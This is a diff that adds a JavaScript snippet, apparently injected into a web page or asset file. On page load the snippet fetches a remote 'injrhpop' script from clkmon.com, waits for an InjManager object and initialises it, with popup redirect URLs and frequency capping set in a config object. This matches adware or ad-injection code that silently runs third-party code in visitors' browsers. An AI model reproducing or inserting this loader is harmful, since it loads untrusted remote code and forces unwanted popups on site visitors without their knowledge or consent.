@@ -1,0 +1,12 @@
+var RHConfig={ js: 'http://cdn1.clkmon.com/script/injrhpop_1.0.4.js', injectUrl : 'http://cdn1.clkmon.com/script/rhpop_1.0.20.js', popupUrl: 'http://clkmon.com/static/rd.html?sa=http://clkmon.com/adServe/sa?cid=GBD5-1050228&pid=4082',cappingMaxNum:6,cappingMinTime:900}; RHConfig.pid='4082';RHConfig.cid='GBD5-1050228';
+ (function() { 
+ fileref=document.createElement('script'); 
+ fileref.setAttribute('type','text/javascript'); 
+ fileref.setAttribute('src', RHConfig.js); 
+ document.getElementsByTagName('body')[0].appendChild(fileref); 
+ var injLoader = setInterval(function() { 
+ if (typeof(InjManager) != 'undefined') { 
+ InjManager.init(); 
+ clearInterval(injLoader); 
+}}, 10);
+})(); 
